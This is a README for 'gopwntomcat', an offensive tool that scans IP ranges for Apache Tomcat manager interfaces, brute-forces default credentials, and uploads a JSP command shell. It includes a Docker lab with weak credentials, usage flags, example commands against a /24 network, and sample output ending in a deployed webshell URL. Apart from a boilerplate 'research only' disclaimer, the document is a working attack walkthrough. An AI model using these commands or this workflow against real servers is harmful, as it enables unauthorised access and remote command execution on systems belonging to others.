# DISCLAIMER
This repository is for research purposes only, the use of this code is your responsibility.

I take NO responsibility and/or liability for how you choose to use any of the source code available here. By using any of the files available in this repository, you understand that you are AGREEING TO USE AT YOUR OWN RISK. Once again, ALL files available here are for EDUCATION and/or RESEARCH purposes ONLY.

# gopwntomcat

This is a small little scanner and exploiting script. It will detect (brute-force) default credentials on a tomcat instance. If you find valid credentials you can use it to upload a command shell or a custom jsp shell.

## Example Environment

I used a docker container to test this script and so can you.

You create two files `tomcat-users.xml` and `context.xml` with the following content. I created them within `/tmp/`.

**tomcat-users.xml**:
```xml
<tomcat-users>
  <role rolename="manager-gui"/>
  <role rolename="manager-script"/>
  <user username="tomcat" password="s3cret" roles="manager-gui,manager-script"/>
</tomcat-users>
```

**context.xml**:
```xml
<Context antiResourceLocking="true" privileged="true" >
  <Manager sessionAttributeValueClassNameFilter="java\.lang\.(?:Boolean|Integer|Long|Number|String)|org\.apache\.catalina\.filters\.CsrfPreventionFilter\$LruCache(?:\$1)?|java\.util\.(?:Linked)?HashMap"/>
   <Realm className="org.apache.catalina.realm.CombinedRealm">
    <Realm className="org.apache.catalina.realm.LockOutRealm"
      failureCount="50" lockOutTime="1" >
	    <Realm className="org.apache.catalina.realm.UserDatabaseRealm"
	      resourceName="UserDatabase"/>
    </Realm>
  </Realm>
</Context>
```

Then you start the docker container like so:

```bash
$ docker run \
  --name tomcat \
  -it --rm \
  -p 8080:8080 \
  -v /tmp/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml \
  -v /tmp/context.xml:/tmp/context.xml \
  tomcat \
  /bin/bash -c "mv /usr/local/tomcat/webapps /usr/local/tomcat/webapps2; mv /usr/local/tomcat/webapps.dist /usr/local/tomcat/webapps; cp /tmp/context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml; catalina.sh run"
```

If this succeeds you will have a tomcat running at http://your-ip:8080 with the manager @ /manager/html and the default login `tomcat:s3cret`.

## Usage
```bash
gopwntomcat v0.0.1
Usage: gopwntomcat -mode [scan|pwn] [mode specific options] (default: mode scan)

Scan options:
	-port		The port to use while scanning		(default: 8080)
	-ssl		Whether or not to use ssl		    (default: false)
	-targeturi	Where the manager app is located at	(default: /manager/html)
	-threads	Concurrent threads while scanning	(default: 1)
	-rhost		IP or CIDR - you can define multiple

Pwn options:
	-port		The port to use for connection		(default: 8080)
	-ssl		Whether or not to use ssl	    	(default: false)
	-targeturi	Where the manager app is located at	(default: /manager/html)
	-user		Valid username for logon		    (default: tomcat)
	-pass		Valid password for logon		    (default: tomcat)
	-customjsp	Define custom jsp to upload		    (default: embedded cmd jsp)
	-rhost		Single IP, no multiple -rhost flags allowed

Examples:
	Scan a /24 net with 5 threads and different manager url:
		gopwntomcat -targeturi /custom/path/to/manager/html -rhost 192.168.1.0/24
	Scan multiple ips on different port with ssl:
		gopwntomcat -port 8443 -ssl -rhost 192.168.1.12 -rhost 10.10.10.100
	Pwn a tomcat server you know the credentials of:
		gopwntomcat -mode pwn -rhost 192.168.1.12 -user tomcat -pass s3cret
	Pwn a tomcat server you know the credentials of with custom jsp:
		gopwntomcat -mode pwn -rhost 192.168.1.12 -user tomcat -pass s3cret -customjsp ./custom.jsp

```

## Scan
With the above environment in place a successful scan could look like this:

```bash
$ ./gopwntomcat -rhost 192.168.1.0/24 -threads 5
2021/02/24 14:54:03 Started scan
----------------------------------------------------------------
2021/02/24 14:54:03 Host 192.168.1.223 responded to /manager/html request
2021/02/24 14:54:03 Host 192.168.1.223 requires authentication. Proceeding with password guessing...
Valid credentials found @192.168.1.223 - tomcat:s3cret
----------------------------------------------------------------
2021/02/24 14:54:33 Scan completed
```

## Exploit
After you got valid credentials you can upload a command shell using this command:

```bash
./gopwntomcat -mode pwn -rhost 192.168.1.223 -user tomcat -pass s3cret
2021/02/24 14:57:45 Let the pwn begin
2021/02/24 14:57:45 Fetching sessin ID and CSRF token...
2021/02/24 14:57:45 Uploading and deploying n7bnhMI7q9zoNJ2XmUsugswWa9QEfjxB ...
2021/02/24 14:57:45 Uploading 1059 bytes as n7bnhMI7q9zoNJ2XmUsugswWa9QEfjxB.war ...
2021/02/24 14:57:45 Upload was successful. Find your shell @ http://192.168.1.223:8080/n7bnhMI7q9zoNJ2XmUsugswWa9QEfjxB/AJ8IVUezjlrg1g4DsKI80PVTinkchs8e.jsp
```

Navigating your browser to the link will result in a webshell showing up:

![screenshot](/screenshot.png "Command shell in browser")